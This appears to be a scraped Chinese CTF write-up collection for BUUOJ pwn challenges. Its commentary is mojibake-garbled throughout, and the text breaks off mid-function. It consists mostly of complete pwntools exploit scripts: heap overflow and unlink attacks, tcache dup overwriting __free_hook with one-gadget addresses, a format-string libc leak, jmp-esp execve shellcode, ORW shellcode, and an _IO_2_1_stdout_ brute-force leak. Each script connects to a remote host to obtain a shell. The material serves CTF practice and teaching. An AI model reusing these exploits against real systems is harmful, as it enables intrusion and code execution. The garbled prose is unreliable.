#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('Heap',str(size)) sa('heap',str(data)) def edit(idx,data): sla('choice','2') sla('dex',str(idx)) sa('heap',str(data)) def show(idx): sla('choice','3') sla('dex',str(idx)) def free(idx): sla('choice','4') sla('dex',str(idx)) add(0x18,'\\x00') add(0x20,'bbbb') add(0x20,'cccc') add(0x10,'dddd') payload = 0x18 * 'a' + '\\xa1' edit(0,payload) free(1) add(0x10,'\\x78') show(1) ru('Content : ') base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',base) free(1) free_hook = 0x3c67a8 + base paylaod = '\\x00' * 2 * 8 + p64(8) + p64(free_hook) add(0x30,paylaod) rce = base + rce16[1] edit(2,p64(rce)) free(0) itr() 0ctf_2017_babyheapåˆ†æä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€†å‘èµ·æ¥çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå¹¶ä¸”å †å—å®šä½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚ï¼Œæ²¡æœ‰å…¨å±€æŒ‡é’ˆã€‚ çŸ¥è¯†ç‚¹calloc å‡½æ•°åŸºæœ¬è·Ÿmallocä¸€æ ·ï¼Œä½†æ˜¯å†åˆ†é…å¥½å †å—æ—¶ï¼Œä¼šæŠŠåˆ†é…åˆ°çš„å †å—å…¨éƒ¨æ¸…ç†ä¸º0ã€‚ å½±å“æ— æ³•é€šè¿‡ä¼ ç»Ÿçš„unsortbinæ¥leak libcï¼Œç»“åˆfillå‡½æ•°ä¸­çš„å †æº¢å‡ºå³å¯ã€‚ æ¼æ´ç‚¹Fill å‡½æ•°ä¸­ï¼Œæ˜æ˜¾æœ‰å †æº¢å‡ºï¼Œä¸”ååˆ†å¥½ç”¨ï¼Œæ•ˆæœå¾ˆå¤§ã€‚ expfrom pwn import * import time local_file = './0ctf_2017_babyheap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26374) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('Command','1') sla('Size',str(size)) def fill(idx,size,data): sla('mand','2') sla('dex',str(idx)) sla('ize',str(size)) sa('tent',str(data)) def free(idx): sla('mand','3') sla('dex',str(idx)) def dump(idx): sla('mand','4') sla('dex',str(idx)) add(0x30) #0 add(0x30) #1 add(0x10) #2 add(0x10) #3 add(0x10) #4 add(0x20) #5 payload = 'a' * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4 fill(0,0x60,payload) free(1) add(0x30) dump(2) ru('Content: \\n') base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',base) add(0x50) #6 add(0x60) #7 add(0x60) #8 free(7) free(8) malloc_hook = base + 0x3c4b10 payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload) add(0x60) #7 add(0x60) #8 rec = rce16[1] + base payload = 'a' * 0x13 + p64(rec) fill(8,len(payload),payload) add(0x20) itr() wustctf2020_closedclose(1); close(2); return shell(); ç›´æ¥å°±ç»™ä½ shelläº†ï¼Œä½†æ˜¯stdoutå·²ç»è¢«å…³é—­äº†ã€‚ä½†æ˜¯å¯¹å…¶æ–‡ä»¶æè¿°ç¬¦1è¿›è¡Œé‡å®šå‘ä¸ºæ²¡æœ‰å…³é—­çš„0å³å¯ã€‚ exec 1&gt;&amp;0 &amp;&amp; cat flag wustctf2020_getshell_2åˆ†æssize_t vulnerable() &#123; char buf; // [esp+0h] [ebp-18h] return read(0, &amp;buf, 0x24u); &#125; æ˜æ˜¾å¯ä»¥çœ‹å‡ºåªå¯ä»¥æ§åˆ¶2ä¸ªgadgetã€‚ä¼˜å…ˆæƒ³åˆ°äº†æ ˆè¿ç§»ã€‚å¯æ˜¯ä¹Ÿæ²¡æœ‰åˆé€‚åœ°æ–¹å»è¿ç§»åˆ©ç”¨ã€‚ å€˜è‹¥å¯ä»¥æ§åˆ¶3ä¸ªgadgetï¼Œç›´æ¥ï¼š p32(system.plt) + p32(0xdeadbeef) + p32(sh) è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚ å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ååˆ†ç»å¸¸**ç”¨å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚ çªç ´ä½†æ˜¯å°è¯•å»çœ‹ä¸‹åé—¨å‡½æ•°ï¼š .text:08048521 ; 2: return system(\"/bbbbbbbbin_what_the_f?ck__--??/sh\"); .text:08048521 sub esp, 0Ch .text:08048524 push offset command ; \"/bbbbbbbbin_what_the_f?ck__--??/sh\" .text:08048529 call _system .text:0804852E add esp, 10h .text:08048531 nop .text:08048532 leave .text:08048533 retn åœ¨08048524å¤„ï¼Œå¯ä»¥çœ‹åˆ°èµ·å…¶call systemå‰ï¼Œpush offset commandï¼ŒæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å‹æ ˆï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚ é‚£å°±åœ¨æº¢å‡ºæ—¶ï¼Œè¿”å›åœ°å€å¡«ä¸Š08048529 ï¼Œåœ¨è‡ªå·±å¡«ä¸Šshçš„åœ°å€å³å¯äº†ã€‚ è¿™æ ·å°±åœ¨call systemæ—¶ï¼Œå®Œæˆçš„æ˜¯system(sh)ã€‚ å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼š ç”±äºå› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ç»å¸¸ç”¨`å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1`ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚ ï¼Œå…¶å®è‡ªå·±åˆ†æä»¥åå°±æ˜¯ï¼šå‡½æ•°çš„plt+4å­—èŠ‚+å‚æ•°1ã€‚ æº¢å‡ºæ—¶ï¼Œå¡«ä¸Šp32(0x8048529) + p32(sh)æ ˆä¿¡æ¯ï¼š 0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;: call 0x80483e0 &lt;system@plt&gt;) 0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 ('sh') åœ¨æº¢å‡ºè°ƒç”¨æ—¶,retåˆ°ï¼š .text:08048529 call _system å…¶å°±æ˜¯ push eip+4 jmp system.plt ç„¶åæ ˆå°±å˜æˆäº†ï¼š =&gt; 0x80483e0 &lt;system@plt&gt;: jmp DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;: push 0x18 | 0x80483eb &lt;system@plt+11&gt;: jmp 0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;: jmp DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push 0x20 |-&gt; 0x80483e6 &lt;system@plt+6&gt;: push 0x18 0x80483eb &lt;system@plt+11&gt;: jmp 0x80483a0 0x80483f0 &lt;__libc_start_main@plt&gt;: jmp DWORD PTR ds:0x804a01c 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push 0x20 JUMP is taken [------------------------------------stack-------------------------------------] 0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;: add esp,0x10) 0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 ('sh') è¿™å°±å˜æˆäº†ï¼Œè‡ªå·±ç†Ÿæ‚‰çš„å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1 expfrom pwn import * import time local_file = './wustctf2020_getshell_2' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25032) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] offset = 28 sh = elf.search('sh\\x00').next() system = 0x8048529 payload = 'a' * offset + p32(system) + p32(sh) s(payload) itr() axb_2019_heapåˆ†æä¿æŠ¤å…¨å¼€ã€‚ æ¼æ´ç‚¹ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„æ¼å‡ºç¨‹åºå’Œlibcçš„åŸºå€ editå‡½æ•°ä¸­ï¼Œé”™è¯¯çš„sizeé€‰å–ï¼Œå¯¼è‡´æ¯æ¬¡å¯ä»¥å¤šæº¢å‡º0x10çš„å­—èŠ‚ï¼Œå¨åŠ›å°±å¾ˆå¤§äº†ï¼Œprev sizeä¸ sizeéƒ½å¯ä»¥æ”¹åˆ°ã€‚ ç›´æ¥è¿›è¡Œunlinkæ”»å‡»å³å¯ã€‚ä¼°è®¡å°±æ˜¯è€ƒè¿™ä¸ªçš„ï¼Œç¨‹åºé™åˆ¶äº†ä¸èƒ½ç”³è¯·0x80ä»¥ä¸‹çš„å †å—ï¼Œä¸”keyå€¼åŸºæœ¬æ²¡åŠæ³•æ”¹åˆ°ã€‚ expfrom pwn import * import time local_file = './axb_2019_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26837) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('&gt;&gt;','1') sla('(0-10)',str(idx)) sla('size',str(size)) sla('content',str(data)) def free(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def edit(idx,data): sla('&gt;&gt;','4') sla('dex',str(idx)) sla('content',str(data)) payload = '%15$p' + '%11$p' sla('name',payload) ru('Hello, 0x') libc_base = int(r(12),16) - 0x20830 info_addr('libc_base',libc_base) ru('0x') bin_base = int(r(12),16) - 0x1186 info_addr('bin_base',bin_base) note = bin_base + 0x202060 key = bin_base + 0x202040 add(0,0x88,'aaaaaaaa') add(1,0x100,'bbbbbbbb') add(2,0x88,'cccccccc') payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30) payload += p64(0) * 9 + p64(0x80) + p64(0x110) edit(0,payload) free(1) free_hook = 0x3c67a8 + libc_base payload = p64(0) * 3 + p64(free_hook) + p64(0x88) edit(0,payload) rec = rce16[1] + libc_base edit(0,p64(rec)) free(2) itr() hitcontraining_unlinkåˆ†æEditå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªå¤§å¨åŠ›çš„å †æº¢å‡ºã€‚ç”¨unlinkæ”»å‡»ã€‚ expfrom pwn import * import time local_file = './bamboobox' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26818) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','2') sla('len',str(size)) sa('name',str(data)) def edit(idx,size,data): sla('ice','3') sla('dex',str(idx)) sla('len',str(size)) sa('name',str(data)) def show(): sla('choice','1') def free(idx): sla('ice','4') sla('dex',str(idx)) note = 0x006020C0 + 8 add(0x88,'aaaaaaaa') add(0x100,'bbbbbbbb') add(0x88,'cccccccc') payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30) payload += p64(0) * 9 + p64(0x80) + p64(0x110) edit(0,len(payload),payload) free(1) show() ru('0 : ') libc_base = uu64(r(6)) - 0x3c48e0 info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base payload = p64(libc_base + 0x3c48e0) + p64(0) + p64(0x88) + p64(free_hook) edit(0,len(payload),payload) rec = rce16[1] + libc_base edit(0,8,p64(rec)) free(2) itr() ciscn_2019_s_9åˆ†æ32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å…³ï¼Œç›®æ ‡å®šä½ç€shellcodeå»ã€‚ æ¼æ´ç‚¹æ ˆæº¢å‡ºï¼Œå¯ä»¥æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯32ä½ç¨‹åºç”¨ropå°±å¯ä»¥æ‰“äº†ã€‚ä½†æ˜¯ä¸ºç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚ .text:08048551 hint proc near .text:08048551 ; __unwind &#123; .text:08048551 55 push ebp .text:08048552 89 E5 mov ebp, esp .text:08048554 FF E4 jmp esp .text:08048554 hint endp åœ¨é¢˜ç›®å½“ä¸­ï¼Œæœ‰ä¸ªhintå‡½æ•°ï¼Œå°±æ˜¯ç»™æç¤ºçš„ï¼Œæç¤ºåˆ°jmp esp è¿™ä¸ªgadgetã€‚ å…¶ä¸­ï¼Œå¯ä»¥æƒ³åˆ°åœ¨æ ˆæº¢å‡ºä¸­ï¼Œæœ‰ç»™ret addrå¡«ä¸Šjmp esp ï¼Œåœ¨æ¥ä¸Šshellcodeã€‚è¿™åº”è¯¥æ˜¯å¾ˆç»å…¸çš„ç”¨æ³•ã€‚ å‚è€ƒé“¾æ¥ï¼šhttp://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/ æ„é€ æ€è·¯ï¼š Payload = overflow + jmp esp address + shellcode ä½†æ˜¯è¿™ä¸ªé¢˜å°±æ˜¯åªèƒ½æº¢å‡º14å­—èŠ‚ï¼Œè¿”å›åœ°å€å†å ç”¨4å­—èŠ‚ï¼Œåº”è¯¥æ²¡æœ‰10å­—èŠ‚è¿™æ ·å°‘çš„shellcodeã€‚ æ‰€ä»¥è½¬å˜ä¸€ä¸‹ï¼Œæ ˆä¸Šå¡«å……å¥½shellcodeï¼Œç„¶åjmp esp addressï¼Œæ¥ç€è®©å…¶æ‰§è¡Œsub esp,0x28ï¼Œç„¶ååœ¨è·³è½¬espã€‚ Payload = shellcode + jmp esp address + sub esp,esp + jmp esp å…¶å®åŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢è·Ÿä¸Šçš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè°ƒæ•´espæŒ‡é’ˆçš„shellcodeã€‚ espfrom pwn import * import time local_file = './ciscn_s_9' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26283) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() jmp_esp = 0x08048554 shellcode= '\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80' shellcode = shellcode.ljust(0x24,'\\x00') gadgets = asm('sub esp,0x28;jmp esp') print(gadgets) payload = shellcode + p32(jmp_esp) + gadgets # debug() sl(payload) itr() roarctf_2019_realloc_magicåˆ†ææ¼æ´ç‚¹ UAF ç¨‹åºç”¨reallocå‡½æ•°æ¥åˆ†é…å †å—ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¿™ä¸ªæçš„æˆ‘ï¼Œå¥½ä¹…æ²¡æœ‰åšå‡ºæ¥ã€‚ çŸ¥è¯†ç‚¹reallocçš„ç‰¹ç‚¹åŸºç¡€åŠŸèƒ½æ˜¯æ”¹å˜mem_addressæ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å¤§å°ä¸ºnewsizeé•¿åº¦ã€‚è¿™é‡Œå°±æœ‰å‡ ç§ä¸åŒçš„æƒ…å†µ 1.å½“sizeä¸º0ï¼Œè¿™æ—¶å°±ç›¸å½“äºfree()å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºnull 2.å½“æŒ‡é’ˆä¸º0ï¼Œsizeå¤§äº0ï¼Œç›¸å½“äºmallocå‡½æ•° 3.sizeå°äºç­‰äºåŸæ¥çš„sizeï¼Œåˆ™åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šç¼©å°ï¼Œå¤šä½™çš„å †å—freeæ‰ 4.sizeå¤§äºåŸæ¥çš„sizeï¼Œå¦‚æœæœ‰è¶³å¤Ÿç©ºé—´å°±åŸåŸºç¡€æ‰©å……ï¼Œç©ºé—´ä¸è¶³åˆ™åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥æŒ‡é’ˆæŒ‡å‘çš„å †å—æ—§å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—å†…å­˜ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—freeæ‰ã€‚ å…¶ä¸­ç¬¬4ç‚¹ï¼Œæœ‰è¶³å¤Ÿç©ºé—´ï¼Œç”»å›¾è§£é‡Šä¸€ä¸‹ï¼š ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œæ¥åˆ¶ä½œ3ä¸ªå †å—Aã€Bã€Cï¼ŒBå †å—ä½œä¸ºè¿›å…¥unsortbinçš„å †å—å­˜åœ¨ï¼ŒCæ˜¯ä¸ºäº†é˜²æ­¢ä¸è®©Cåˆå¹¶top chunkï¼Œç„¶åç”¨Aæ¥ç”³è¯·ä¸€ä¸ªsize&lt;=ï¼ˆAçš„size + Bçš„sizeï¼‰çš„å †å—ï¼Œè¿™æ ·å°±é€ æˆäº†å †å—çš„é‡å ã€‚ åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯å‚è€ƒé“¾æ¥ï¼šhttp://pzhxbz.cn/?p=139 http://blog.eonew.cn/archives/1190 http://blog.eonew.cn/archives/1190 è¿™ä¸ªé¢˜å› ä¸ºæœ‰è¿‡è¾“å‡ºï¼Œå…¶_IO_CURRENTLY_PUTTINGå°±æ˜¯ä¸º1çš„ ï¼Œå¯¹äº_IO_IS_APPENDINGè¿™ä¸ªflagçš„å€¼ï¼Œå°†è¿™ä¸ªflagææˆ1ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹_IO_buf_baseæ¥å®Œæˆleakã€‚ åœ¨èµ›é¢˜ä¸­ï¼Œå¾ˆå¤šç¨‹åºéƒ½æ˜¯ç”¨è¿‡è¾“å‡ºå‡½æ•°è¿›è¡Œè¾“å‡ºçš„ï¼ŒåŸºæœ¬å°±æ˜¯æ”¹æ‰flagï¼Œä¸­é—´çš„ä¸‰ä¸ªå˜é‡åœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­éƒ½ä¸æ€ä¹ˆç”¨å¾—åˆ°ï¼Œç›´æ¥ç›–æˆ0,ä½ä½è¦†ç›–_IO_buf_baseä¸ºåˆé€‚çš„å€¼å°±å¯ä»¥å®Œæˆleakã€‚ Flag æ€ä¹ˆè®¾ç½®ï¼Œåœ¨èµ›é¢˜ä¸­è¿˜æ˜¯å¾ˆéšæ„çš„ï¼š 0xfbad1887 0xfbad3c80 é‡ç‚¹å°±æ˜¯è®©stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base å¤§ä½“çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯åˆ©ç”¨unsorted binçš„åœ¨tcacheæˆ–fastbinçš„fdä¸Šç•™ä¸‹main_arenaçš„åœ°å€ï¼Œç”±äº_IO_2_1_stdout_ä¸arenaåªç›¸å·®4ä½ï¼Œä¸”ä½ä¸‰ä½å·²çŸ¥ï¼Œåœ¨ä¼ å…¥æ˜¯ä½3ä½è¦†ç›–fdç•™ä¸‹çš„main_arenaçš„åœ°å€ï¼Œå‰©ä½™ä¸€ä½å¯ä»¥çˆ†ç ´ï¼Œæ¦‚ç‡1/16,ä»è€ŒåŠ«æŒstdoutä»¥è¾¾åˆ°æ³„éœ²çš„ç›®çš„ ã€‚ expfrom pwn import * import time local_file = './roarctf_2019_realloc_magic' elf = ELF(local_file) # context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28690) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('&gt;&gt;','1') sla('?',str(size)) if int(size) != 0 : sa('?',str(data)) def free(): sla('&gt;&gt;','2') def leak_addr(): add(0x80,'aaaaaaa') add(0,'') add(0x100,'aaaaaaaa') add(0,' ') add(0x110,' ') add(0,'') add(0x100,'a') for i in range(7): free() add(0,'1') add(0x80,'\\x60\\x87') payload = 17 * p64(0) + p64(0x61) + '\\x60\\x87' add(0x190,payload) add(0,'') add(0x100,'\\x60\\x87') add(0,'') payload = p64(0xfbad3c80) + '\\x00' * 8 * 3 + '\\x00' add(0x100,payload) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception('') break except Exception: io.close() # io = process('./roarctf_2019_realloc_magic') io = remote('node3.buuoj.cn',28690) continue leak = leak &gt;&gt; 16 info_addr('leak',leak) libc_base = leak - 4110208 info_addr('libc_base',libc_base) free_hook = 4118760 + libc_base sys_addr = 324832+libc_base sla('&gt;&gt;','666') add(0x120,'aaaaaaa') add(0,'') add(0x130,'aaaaaaaa') add(0,' ') add(0x160,' ') add(0,'') add(0x130,'a') for i in range(7): free() add(0,'1') add(0x120,'\\x60\\x87') payload = 37 * p64(0) + p64(0x71) + p64(free_hook) add(0x260,payload) add(0,'') add(0x130,'a') add(0,'') one_rec = rce18[1] +libc_base add(0x130,p64(one_rec)) free() # debug() itr() å…¶ä¸­expçš„çˆ†ç ´stdoutéƒ¨åˆ†ï¼Œå¯ä»¥å½“ä½œæ¨¡ç‰ˆä½¿ç”¨ï¼Œæ¥è‡ªpzhxbzå¤§ä½¬çš„ã€‚ ciscn_2019_en_3åˆ†æå¸¸è§„å †é¢˜ï¼ŒUAFï¼Œdupæ‰“free_hook_ã€‚ä¸Šæ¥ç”¨puts(&amp;s)ï¼Œæ¥æ³„æ¼æ ˆä¸Šå­˜åœ¨çš„libcåœ°å€ã€‚ expfrom pwn import * import time local_file = './ciscn_2019_en_3' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29542) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('ice','1') sla('size',str(size)) sa('story',str(data)) def free(idx): sla('ice','4') sla('dex',str(idx)) payload = 'a' * (0x20-8) sa('name',payload) sa('ID','chumen77') ru('chumen77') libc_base = uu64(r(6)) - 0x81237 info_addr('libc_base',libc_base) add(0x50,'aaaaaaaa') free(0) free(0) free_hook = libc_base + 0x3ed8e8 add(0x50,p64(free_hook)) add(0x50,p64(free_hook)) rec = rce18[1] + libc_base add(0x50,p64(rec)) free(0) itr() æå®¢å¤§æŒ‘æˆ˜2019 Not badåˆ†ææº¢å‡º0x18ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ¬èº«çš„æ ˆé•¿åº¦ï¼Œè¯»orw çš„shellcodeå†…å­˜ä¸æ˜¯å¾ˆå¤Ÿç”¨ã€‚éœ€è¦è¿ç§»åˆ°mmapï¼Œè¿›è¡Œorwã€‚æ‰€ä»¥æ‘†åœ¨æ ˆä¸Šçš„shellcodeå°±æ˜¯ï¼Œæ¥ä¸€ä¸ªreadå‡½æ•°ï¼ŒæŠŠorwæ”¾åœ¨mmapä¸Šï¼Œç„¶åå†è·³è½¬ä¸Šå»æ‰§è¡Œå³å¯ã€‚å¹¶ä¸”å†æ¬¡ç”¨åˆ° jmp rsp + shellcode. expfrom pwn import * import time local_file = './bad' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29794) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() mmap = 0x123000 jmp_rsp = 0x0000000000400a01 # bss = 0x6010B0 - 0x20 orw = asm(shellcraft.open(\"./flag\")) orw += asm(shellcraft.read(3,\"rsp\",0x30)) orw += asm(shellcraft.write(1,\"rsp\",0x30)) payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm('mov rax,0x123300;call rax') payload = payload.ljust(0x28,'a') payload += p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp') sa('fun',payload) s(orw) itr() ciscn_2019_final_5åˆ†æArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ä¿æŠ¤å¼€çš„ä¸å¤šï¼Œåˆ†æå’Œåˆ©ç”¨èµ·æ¥ç®€å•ä¸å°‘ã€‚ è¿™ä¸ªé¢˜éš¾ç‚¹å°±æ˜¯åœ¨äºå‘ç°æ¼æ´ç‚¹ã€‚ addå‡½æ•°__int64 result; // rax signed int i; // [rsp+4h] [rbp-1Ch] int size; // [rsp+8h] [rbp-18h] int idx; // [rsp+Ch] [rbp-14h] void *buf; // [rsp+10h] [rbp-10h] __int64 v5; // [rsp+18h] [rbp-8h] printf(\"index: \"); idx = read_int(); if 